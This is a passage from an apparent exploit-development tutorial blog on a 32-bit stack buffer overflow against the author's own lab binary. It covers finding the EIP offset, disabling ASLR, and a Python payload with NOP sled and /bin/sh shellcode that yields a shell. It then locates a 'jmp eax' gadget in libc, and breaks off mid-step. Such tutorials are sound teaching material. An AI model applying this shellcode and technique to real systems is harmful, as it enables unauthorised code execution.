+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ pwn cyclic <span style="color:#ae81ff">100</span>
+</span></span><span style="display:flex;"><span>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+</span></span><span style="display:flex;"><span>$ ./exp1 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$ gdb -core core 
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span> EAX  0xffcf460e ◂— <span style="color:#e6db74">&#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#39;</span>
+</span></span><span style="display:flex;"><span> EBX  0x616f6161 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;aaoa&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> ECX  0xffcf58e0 ◂— 0x616161 /* <span style="color:#e6db74">&#39;aaa&#39;</span> */
+</span></span><span style="display:flex;"><span> EDX  0xffcf466f ◂— 0x616161 /* <span style="color:#e6db74">&#39;aaa&#39;</span> */
+</span></span><span style="display:flex;"><span> EDI  0xf7f9eb60 ◂— <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> ESI  0xffcf4740 —▸ 0xffcf58e4 ◂— <span style="color:#e6db74">&#39;SHELL=/usr/bin/bash&#39;</span>
+</span></span><span style="display:flex;"><span> EBP  0x61706161 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;aapa&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> ESP  0xffcf4650 ◂— <span style="color:#e6db74">&#39;aaraaasaaataaauaaavaaawaaaxaaayaaa&#39;</span>
+</span></span><span style="display:flex;"><span> EIP  0x61716161 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;aaqa&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>────────────────────────────<span style="color:#f92672">[</span> DISASM / i386 / set emulate on <span style="color:#f92672">]</span>────────────────────────────
+</span></span><span style="display:flex;"><span>Invalid address 0x61716161
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Using the <code>pwn cyclic -l</code> command, we can determine the offset of the cyclic pattern:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ pwn cyclic -l 0x61716161
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">62</span>
+</span></span></code></pre></div><p><strong>Crafting the Exploit 🎯</strong></p>
+<p>Now that we know the offset, we can craft our payload. Let&rsquo;s send 62 &lsquo;A&rsquo;s followed by 4 &lsquo;B&rsquo;s:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./exp1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$ gdb -core core 
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>──────────────────<span style="color:#f92672">[</span> REGISTERS / show-flags off / show-compact-regs off <span style="color:#f92672">]</span>──────────────────
+</span></span><span style="display:flex;"><span> EAX  0xff9b099e ◂— <span style="color:#e6db74">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB&#39;</span>
+</span></span><span style="display:flex;"><span> EBX  0x41414141 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;AAAA&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> ECX  0xff9b28e0 ◂— 0x424242 /* <span style="color:#e6db74">&#39;BBB&#39;</span> */
+</span></span><span style="display:flex;"><span> EDX  0xff9b09dd ◂— 0x424242 /* <span style="color:#e6db74">&#39;BBB&#39;</span> */
+</span></span><span style="display:flex;"><span> EDI  0xf7fafb60 ◂— <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> ESI  0xff9b0ad0 —▸ 0xff9b28e4 ◂— <span style="color:#e6db74">&#39;SHELL=/usr/bin/bash&#39;</span>
+</span></span><span style="display:flex;"><span> EBP  0x41414141 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;AAAA&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> ESP  0xff9b09e0 —▸ 0xff9b2800 ◂— <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> EIP  0x42424242 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;BBBB&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>────────────────────────────<span style="color:#f92672">[</span> DISASM / i386 / set emulate on <span style="color:#f92672">]</span>────────────────────────────
+</span></span><span style="display:flex;"><span>Invalid address 0x42424242
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Success! We have successfully controlled the EIP! 🎉</p>
+<p>Now that we’ve successfully controlled the <code>EIP</code>, let’s move on to constructing our exploit! For reference, take a look at the diagram I created for you:</p>
+<p><img src="/images/exp-dev/eip.png" alt="buffer"></p>
+<p>As illustrated in the diagram, we’ll generate our exploit in such a way that the <code>EIP</code> points to our NOP sled. Following the NOP sled, we’ll place our shellcode. If the shellcode doesn’t fill the required length, we can add some &ldquo;junk&rdquo; data to pad it out. Finally, we’ll include the address of our NOP sled to overwrite the return address, ensuring the program redirects execution to our NOP sled, ultimately leading to the execution of the shellcode! 🚀</p>
+<p>With this approach, we can effectively take control of the program flow and execute our malicious payload. Let’s get to work on crafting this exploit! 💻✨</p>
+<p>Note: Please disable Address Space Layout Randomization (ASLR) by running the following command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#ae81ff">0</span> | sudo tee /proc/sys/kernel/randomize_va_space
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># exp1.py</span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">62</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">10</span> <span style="color:#75715e"># 10 NOPS</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># /bin/sh shellcode</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>(offset<span style="color:#f92672">-</span>len(payload)) <span style="color:#75715e"># padding</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;BBBB&#34;</span> <span style="color:#75715e"># EIP</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;C&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">10</span>  <span style="color:#75715e"># Junk (not compulsory but in some cases it is useful)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(payload)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./exp1 <span style="color:#66d9ef">$(</span>./exp1.py<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$ gdb -core core
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>──────────────────<span style="color:#f92672">[</span> REGISTERS / show-flags off / show-compact-regs off <span style="color:#f92672">]</span>──────────────────
+</span></span><span style="display:flex;"><span> EAX  0xffc6c7fe ◂— 0x90909090
+</span></span><span style="display:flex;"><span> EBX  0x41414141 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;AAAA&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> ECX  0xffc6d8e0 ◂— 0x434343 /* <span style="color:#e6db74">&#39;CCC&#39;</span> */
+</span></span><span style="display:flex;"><span> EDX  0xffc6c847 ◂— 0x434343 /* <span style="color:#e6db74">&#39;CCC&#39;</span> */
+</span></span><span style="display:flex;"><span> EDI  0xf7fa9b60 ◂— <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> ESI  0xffc6c930 —▸ 0xffc6d8e4 ◂— <span style="color:#e6db74">&#39;SHELL=/usr/bin/bash&#39;</span>
+</span></span><span style="display:flex;"><span> EBP  0x41414141 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;AAAA&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> ESP  0xffc6c840 ◂— <span style="color:#e6db74">&#39;CCCCCCCCCC&#39;</span>
+</span></span><span style="display:flex;"><span> EIP  0x42424242 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;BBBB&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>────────────────────────────<span style="color:#f92672">[</span> DISASM / i386 / set emulate on <span style="color:#f92672">]</span>────────────────────────────
+</span></span><span style="display:flex;"><span>Invalid address 0x42424242
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>The following diagram, created by me, will help clarify your understanding.
+<img src="/images/exp-dev/eip-arrow.png" alt="buffer-overflow"></p>
+<p>As you can see, instead of using &ldquo;BBBB&rdquo; we can directly use the address <code>0xffffd59e</code> in little-endian format.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># exp1.py</span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">62</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">10</span> <span style="color:#75715e"># 10 NOPS</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># /bin/sh shellcode</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>(offset<span style="color:#f92672">-</span>len(payload)) <span style="color:#75715e"># padding</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># payload += &#34;BBBB&#34; # EIP</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x9e\xd5\xff\xff</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># NOP sled address</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;C&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">10</span>  <span style="color:#75715e"># Junk (not compulsory but in some cases it is useful)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(payload)
+</span></span></code></pre></div><p>I removed the &ldquo;C&rdquo; junk, and the exploit worked perfectly:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># exp1.py</span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">62</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">10</span> <span style="color:#75715e"># 10 NOPS</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># /bin/sh shellcode</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>(offset<span style="color:#f92672">-</span>len(payload)) <span style="color:#75715e"># padding</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># payload += &#34;BBBB&#34; # EIP</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x9e\xd5\xff\xff</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># NOP sled address</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(payload)
+</span></span></code></pre></div><p>When we run the exploit, we successfully obtain a shell! 🎉</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./exp1 <span style="color:#66d9ef">$(</span>./exp1.py<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>$ ls
+</span></span><span style="display:flex;"><span>core  exp1  exp1.c  exp1.py
+</span></span></code></pre></div><p>Now, let&rsquo;s explore an alternative method to exploit this vulnerability using the <code>jmp eax</code> instruction.
+When we used &ldquo;BBBB&rdquo; to overwrite <code>EIP</code> and analyze the core dump:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># exp1.py</span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">62</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">10</span> <span style="color:#75715e"># 10 NOPS</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># /bin/sh shellcode</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>(offset<span style="color:#f92672">-</span>len(payload)) <span style="color:#75715e"># padding</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;BBBB&#34;</span> <span style="color:#75715e"># EIP</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(payload)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gdb -core core 
+</span></span><span style="display:flex;"><span>Program terminated with signal SIGSEGV, Segmentation fault.
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#0  0x42424242 in ?? ()</span>
+</span></span><span style="display:flex;"><span>------- tip of the day <span style="color:#f92672">(</span>disable with set show-tips off<span style="color:#f92672">)</span> -------
+</span></span><span style="display:flex;"><span>Use patch &lt;address&gt; <span style="color:#e6db74">&#39;&lt;assembly&gt;&#39;</span> to patch an address with given assembly code
+</span></span><span style="display:flex;"><span>LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+</span></span><span style="display:flex;"><span>──────────────────<span style="color:#f92672">[</span> REGISTERS / show-flags off / show-compact-regs off <span style="color:#f92672">]</span>──────────────────
+</span></span><span style="display:flex;"><span> EAX  0xffffd59e ◂— 0x90909090
+</span></span><span style="display:flex;"><span> EBX  0x41414141 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;AAAA&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> ECX  0xffffd8e0 ◂— 0x424242 /* <span style="color:#e6db74">&#39;BBB&#39;</span> */
+</span></span><span style="display:flex;"><span> EDX  0xffffd5dd ◂— 0x424242 /* <span style="color:#e6db74">&#39;BBB&#39;</span> */
+</span></span><span style="display:flex;"><span> EDI  0xf7ffcb60 ◂— <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> ESI  0xffffd6d0 —▸ 0xffffd8e4 ◂— <span style="color:#e6db74">&#39;SHELL=/usr/bin/bash&#39;</span>
+</span></span><span style="display:flex;"><span> EBP  0x41414141 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;AAAA&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> ESP  0xffffd5e0 —▸ 0xffffd800 —▸ 0xf7fc8000 ◂— 0x464c457f
+</span></span><span style="display:flex;"><span> EIP  0x42424242 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;BBBB&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>────────────────────────────<span style="color:#f92672">[</span> DISASM / i386 / set emulate on <span style="color:#f92672">]</span>────────────────────────────
+</span></span><span style="display:flex;"><span>Invalid address 0x42424242
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>We notice that, the <code>EAX</code> register points to our NOP sled. This means that if we use an instruction like <code>jmp eax</code>, we will successfully jump to our NOP sled, allowing for a smooth transition into the execution of our shellcode. This brings us to the concept of &ldquo;gadgets.&rdquo;</p>
+<p><strong>Understanding Gadgets</strong></p>
+<p>Gadgets are short sequences of machine instructions that end in a return instruction (such as ret) and can be used in exploitation techniques, particularly in Return-Oriented Programming (ROP). Instead of injecting and executing our shellcode directly, we can chain together these gadgets to perform arbitrary operations.</p>
+<p>In the context of our exploit, gadgets allow us to manipulate the flow of execution without relying on traditional shellcode. By finding gadgets within the existing code of the binary or linked libraries, we can create a payload that jumps through these gadgets to reach our NOP sled or directly execute shellcode.</p>
+<p>Here’s how it works:</p>
+<ol>
+<li>Finding Gadgets: We use tools like <code>ROPgadget</code> or <code>Ropper</code> to scan the binary for useful instruction sequences.</li>
+<li>Chaining Gadgets: Once we identify useful gadgets, we construct a sequence that leads to the execution of our payload.</li>
+<li>Execution Control: By carefully controlling the stack and return addresses, we can redirect execution to our desired locations.</li>
+</ol>
+<p>For more insights on searching for gadgets using various tools, feel free to check out my <a href="https://kernw0lf.github.io/posts/rop-guide/">blog</a> on gadget hunting! 📚🔍</p>
+<p>Let&rsquo;s explore how to use <code>ropper</code> to find useful gadgets in <code>libc</code>, which is typically loaded whenever a dynamically linked executable runs. We’ve already confirmed that our binary is dynamically linked by checking its dependencies with <code>ldd</code>.</p>
+<p>First, we check the linked libraries:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ldd exp1
+</span></span><span style="display:flex;"><span>	linux-gate.so.1 <span style="color:#f92672">(</span>0xf7fc6000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>	libc.so.6 <span style="color:#f92672">=</span>&gt; /lib32/libc.so.6 <span style="color:#f92672">(</span>0xf7d5a000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>	/lib/ld-linux.so.2 <span style="color:#f92672">(</span>0xf7fc8000<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>This confirms that <code>libc.so.6</code> is being used, and we can find it at <code>/usr/lib32/libc.so.6</code>.</p>
+<p>Now, let’s search for the <code>jmp eax</code> gadget using <code>ropper</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ropper --file /usr/lib32/libc.so.6 --search <span style="color:#e6db74">&#34;jmp eax&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> Load gadgets <span style="color:#66d9ef">for</span> section: LOAD
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>LOAD<span style="color:#f92672">]</span> loading... 100%
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>LOAD<span style="color:#f92672">]</span> removing double gadgets... 100%
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> Searching <span style="color:#66d9ef">for</span> gadgets: jmp eax
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> File: /usr/lib32/libc.so.6
+</span></span><span style="display:flex;"><span>0x00024fe3: jmp eax;
+</span></span></code></pre></div><p>As shown, we found the <code>jmp eax</code> gadget at the address <code>0x00024fe3</code>. This gadget will allow us to jump to the address contained in the EAX register, which, as previously noted, points to our NOP sled.</p>
+<p>When we use <code>ropper</code> to locate gadgets, it provides us with the gadget’s offset within the <code>libc</code> binary. To use this gadget in our exploit, we need to calculate its absolute address by adding the base address of <code>libc</code> to the offset returned by <code>ropper</code>.</p>
+<p><strong>Finding the <code>libc</code> Base Address</strong></p>
+<p>To locate the base address of <code>libc</code> load our binary in gdb, follow these steps:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gdb ./exp1 
+</span></span><span style="display:flex;"><span>pwndbg&gt; b main
+</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">1</span> at 0x565561c6
+</span></span><span style="display:flex;"><span>pwndbg&gt; r
+</span></span><span style="display:flex;"><span>pwndbg&gt; vmmap
+</span></span><span style="display:flex;"><span>LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+</span></span><span style="display:flex;"><span>     Start        End Perm     Size Offset File
+</span></span><span style="display:flex;"><span>0x56555000 0x56556000 r--p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> /home/kali/Desktop/Blogs/Materials/x86_exp_dev/02/exp1
+</span></span><span style="display:flex;"><span>0x56556000 0x56557000 r-xp     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">1000</span> /home/kali/Desktop/Blogs/Materials/x86_exp_dev/02/exp1
+</span></span><span style="display:flex;"><span>0x56557000 0x56558000 r--p     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">2000</span> /home/kali/Desktop/Blogs/Materials/x86_exp_dev/02/exp1
+</span></span><span style="display:flex;"><span>0x56558000 0x56559000 r--p     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">2000</span> /home/kali/Desktop/Blogs/Materials/x86_exp_dev/02/exp1
+</span></span><span style="display:flex;"><span>0x56559000 0x5655a000 rw-p     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">3000</span> /home/kali/Desktop/Blogs/Materials/x86_exp_dev/02/exp1
+</span></span><span style="display:flex;"><span>0xf7d5f000 0xf7d82000 r--p    <span style="color:#ae81ff">23000</span>      <span style="color:#ae81ff">0</span> /usr/lib32/libc.so.6
+</span></span><span style="display:flex;"><span>0xf7d82000 0xf7f0e000 r-xp   18c000  <span style="color:#ae81ff">23000</span> /usr/lib32/libc.so.6
+</span></span><span style="display:flex;"><span>0xf7f0e000 0xf7f93000 r--p    <span style="color:#ae81ff">85000</span> 1af000 /usr/lib32/libc.so.6
+</span></span><span style="display:flex;"><span>0xf7f93000 0xf7f95000 r--p     <span style="color:#ae81ff">2000</span> <span style="color:#ae81ff">234000</span> /usr/lib32/libc.so.6
+</span></span><span style="display:flex;"><span>0xf7f95000 0xf7f96000 rw-p     <span style="color:#ae81ff">1000</span> <span style="color:#ae81ff">236000</span> /usr/lib32/libc.so.6
+</span></span><span style="display:flex;"><span>0xf7f96000 0xf7fa0000 rw-p     a000      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_f7f96<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>0xf7fc0000 0xf7fc2000 rw-p     <span style="color:#ae81ff">2000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_f7fc0<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>0xf7fc2000 0xf7fc6000 r--p     <span style="color:#ae81ff">4000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>vvar<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>0xf7fc6000 0xf7fc8000 r-xp     <span style="color:#ae81ff">2000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>vdso<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>0xf7fc8000 0xf7fc9000 r--p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> /usr/lib32/ld-linux.so.2
+</span></span><span style="display:flex;"><span>0xf7fc9000 0xf7fed000 r-xp    <span style="color:#ae81ff">24000</span>   <span style="color:#ae81ff">1000</span> /usr/lib32/ld-linux.so.2
+</span></span><span style="display:flex;"><span>0xf7fed000 0xf7ffb000 r--p     e000  <span style="color:#ae81ff">25000</span> /usr/lib32/ld-linux.so.2
+</span></span><span style="display:flex;"><span>0xf7ffb000 0xf7ffd000 r--p     <span style="color:#ae81ff">2000</span>  <span style="color:#ae81ff">33000</span> /usr/lib32/ld-linux.so.2
+</span></span><span style="display:flex;"><span>0xf7ffd000 0xf7ffe000 rw-p     <span style="color:#ae81ff">1000</span>  <span style="color:#ae81ff">35000</span> /usr/lib32/ld-linux.so.2
+</span></span><span style="display:flex;"><span>0xfffdd000 0xffffe000 rwxp    <span style="color:#ae81ff">21000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>stack<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>From this output, the base address of <code>libc</code> is noted as <code>0xf7d5f000</code>. To verify the actual address of our desired gadget in memory, we add this base address to the offset of the gadget. Thus, using <code>0xf7d5f000</code> as our <code>libc</code> base address and adding it to the offset <code>0x00024fe3</code>, we obtain the address of the <code>jmp eax</code> gadget.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; p/x 0xf7d5f000 + 0x00024fe3
+</span></span><span style="display:flex;"><span>$1 <span style="color:#f92672">=</span> 0xf7d83fe3
+</span></span><span style="display:flex;"><span>pwndbg&gt; x/i 0xf7d83fe3
+</span></span><span style="display:flex;"><span>   0xf7d83fe3:	jmp    eax
+</span></span></code></pre></div><p>This confirms that <code>0xf7d83fe3</code> is indeed the correct address of the <code>jmp eax</code> gadget. 🎉</p>
+<p>Following diagram will clarify it further:
+<img src="/images/exp-dev/jmp-eax.png" alt="buffer"></p>
+<p>Let&rsquo;s update our exploit and use <code>struct</code> module:</p>
